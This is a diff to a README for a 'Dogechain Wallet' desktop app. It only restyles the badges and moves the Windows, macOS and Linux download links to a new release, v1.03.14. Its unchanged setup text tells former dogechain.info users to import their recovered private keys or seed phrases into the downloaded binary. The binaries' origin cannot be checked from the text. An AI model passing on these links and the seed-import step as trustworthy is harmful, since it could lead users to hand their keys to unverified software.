@@ -1,6 +1,10 @@
-![Dogechain Wallet](https://img.shields.io/badge/Dogechain-Wallet-2E3440) ![Platforms](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-informational) ![License: MIT](https://img.shields.io/badge/license-MIT-green)
+[![Release v1.03.14](https://img.shields.io/badge/RELEASE-v1.03.14-705600?style=for-the-badge&labelColor=3D2817)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) ![Dogechain Wallet](https://img.shields.io/badge/Dogechain%20Wallet-DOGE-705600?style=for-the-badge&labelColor=3D2817) ![Platforms](https://img.shields.io/badge/PLATFORMS-Windows%20%7C%20macOS%20%7C%20Linux-804600?style=for-the-badge&labelColor=3D2817)
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?logo=windows&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?logo=apple&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?logo=linux&logoColor=black)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.zip)
+<p align="center">
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-WINDOWS-705600?style=for-the-badge&labelColor=3D2817&logo=windows&logoColor=white" alt="Download Dogechain Wallet for Windows" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-MACOS-804600?style=for-the-badge&labelColor=3D2817&logo=apple&logoColor=white" alt="Download Dogechain Wallet for macOS" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-LINUX-3D2817?style=for-the-badge&labelColor=3D2817&logo=linux&logoColor=white" alt="Download Dogechain Wallet for Linux" height="40"></a>
+</p>
 
 ---
 
@@ -35,7 +39,7 @@ Dogechain Wallet is built as a non-custodial alternative: your private keys are 
 
 ## Getting set up with self-custody
 
-1. [Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) for your platform.
+1. [Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) for your platform.
 2. If you've recovered a private key or seed phrase from your old dogechain.info account, use the wallet's restore/import function rather than creating a new wallet.
 3. If you're starting fresh, follow [the setup guide for your platform](./dogechain-wallet-windows-setup.md) and make sure to back up your new seed phrase properly — see [How to Properly Back Up Your Dogecoin Wallet](./how-to-backup-dogecoin-wallet.md).
 
@@ -48,4 +52,4 @@ Dogechain Wallet is built as a non-custodial alternative: your private keys are 
 - [Best Dogecoin Wallets in 2026, Compared](./best-dogecoin-wallets-2026.md)
 - [What Is an SPV Wallet? Simplified Payment Verification for Dogecoin Explained](./what-is-spv-wallet-dogecoin.md)
 
-[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
+[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
